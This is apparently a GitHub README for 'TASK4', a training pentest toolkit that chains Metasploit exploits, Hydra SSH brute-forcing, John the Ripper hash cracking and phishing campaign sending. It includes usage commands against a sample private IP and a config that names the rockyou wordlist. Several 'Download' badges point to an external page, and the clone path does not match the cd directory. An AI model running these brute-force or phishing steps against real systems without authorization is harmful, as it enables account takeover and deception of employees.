# TASK4 - Cybersecurity Pentesting Workflow

> **Short product summary.** A cross-platform pentesting workflow tool that combines Metasploit exploitation, password cracking with Hydra and John the Ripper, and phishing simulation for security awareness training. Built for cybersecurity professionals and interns who need to show realistic attack paths in a controlled setting.

[![Platform](https://img.shields.io/badge/Platform-Cross--platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/danielndrhughes5815/task4-attack-sim?style=flat-square)](https://github.com/danielndrhughes5815/task4-attack-sim)

---

<p align="center">
  <a href="https://danielndrhughes5815.github.io/task4-attack-sim/">
    <img src="https://img.shields.io/badge/Download-TASK4%20Latest-brightgreen?style=for-the-badge" alt="Download TASK4">
  </a>
</p>

> **[Direct Download - TASK4 v1.0](https://danielndrhughes5815.github.io/task4-attack-sim/)**

---

[Download Latest Build](https://danielndrhughes5815.github.io/task4-attack-sim/)

---

## Overview

TASK4 is a hands-on cybersecurity toolkit that unifies three essential penetration testing activities into a single workflow. It was first created within a cybersecurity internship program and is meant to help security teams, students, and IT staff see how attackers blend multiple techniques when compromising a system. The focus is on clear, repeatable demonstrations of exploitation, credential cracking, and social engineering.

TASK4 is differentiated by how it ties these attack vectors together. Rather than presenting each method separately, it demonstrates how Metasploit exploitation can be combined with tools such as Hydra and John the Ripper, then extended into phishing simulations to evaluate the human layer. The result is a fuller view of common attack chains and a useful starting point for stronger defenses.

---

## Key Capabilities

- **Metasploit exploitation** -- Run common exploit scenarios through pre-configured modules for testing and demos
- **Password cracking with Hydra** -- Execute fast online brute-force attempts across a range of services and protocols
- **Password cracking with John the Ripper** -- Crack hashes offline with support for many hash types and custom wordlists
- **Phishing simulation** -- Build and launch realistic phishing campaigns to measure employee awareness
- **Integrated workflow** -- Connect exploitation, credential cracking, and phishing inside one demonstration flow
- **Cross-platform compatibility** -- Runs on Windows, Linux, and macOS with minimal setup
- **Educational focus** -- Built for training use with readable output and logs that support analysis

---

## Installation

Clone the repository to your local machine:

```bash
git clone https://github.com/danielndrhughes5815/task4-attack-sim.git
cd TASK4-pentesting-workflow
```

No additional build steps are required. Ensure you have the necessary dependencies installed (see Requirements section). Launch the tool by running the main script:

```bash
python task4.py
```

---

## Usage

TASK4 is split into three primary modules. You can run them independently or use them as part of a chain:

1. **Exploitation -- Metasploit integration**  
   Start pre-configured Metasploit resource scripts to attack target services:
   ```bash
   python task4.py --module exploit --target 192.168.1.100
   ```

2. **Password cracking -- Hydra and John**  
   Carry out online or offline credential testing:
   ```bash
   python task4.py --module crack --target 192.168.1.100 --service ssh
   ```

3. **Phishing simulation**  
   Send a phishing campaign with a template email and landing page:
   ```bash
   python task4.py --module phishing --template company_update
   ```

Review logs and results in the `output/` directory after each run.

---

## Configuration

All settings live in one YAML file at `config/settings.yaml`. You can change:

- Target IP ranges and ports
- Wordlist paths for password cracking
- Phishing email templates and sender addresses
- Logging verbosity and output formats

Example configuration snippet:

```yaml
metasploit:
  resource_path: ./resources/scripts/
hydra:
  wordlist: /usr/share/wordlists/rockyou.txt
  threads: 4
phishing:
  smtp_server: smtp.example.com
  template_dir: ./templates/
```

---

## Requirements

- Python 3.8 or higher
- Metasploit Framework (community or pro edition)
- Hydra (installed separately)
- John the Ripper (installed separately)
- 500 MB free disk space for wordlists and templates
- Administrative privileges for certain exploitation modules

---

## FAQ

**Q: Can TASK4 be used on production systems?**  
A: No. It is meant for authorized testing and educational environments only. Make sure you have written permission before testing any system you do not own.

**Q: What is the update process for TASK4?**  
A: Pull the latest repository changes with `git pull origin main`. Also review the release notes for any breaking changes.

**Q: Is it possible to add custom Metasploit resource scripts?**  
A: Yes. Put your `.rc` files in `resources/scripts/` and point to them from the configuration file.

**Q: The phishing module is not delivering emails. What should I verify?**  
A: Check the SMTP server settings in `config/settings.yaml`. Some providers block simulated phishing traffic, so a dedicated test mail server is recommended.

**Q: Where can I get wordlists for password cracking?**  
A: Widely used wordlists such as RockYou can be found in different security repositories. TASK4 does not include wordlists because of size limitations.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
